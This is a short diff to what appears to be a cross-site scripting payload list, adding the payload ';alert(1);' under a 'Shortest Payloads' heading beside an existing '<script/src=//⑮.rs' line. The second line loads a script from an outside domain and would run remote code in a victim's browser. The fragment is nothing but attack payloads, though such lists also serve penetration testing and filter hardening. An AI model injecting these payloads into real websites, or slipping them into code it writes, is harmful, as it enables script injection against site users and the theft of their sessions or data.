@@ -23,6 +23,7 @@
 ### Shortest Payloads
 
 ```markup
+';alert(1);'
 <script/src=//⑮.rs
 ```
 
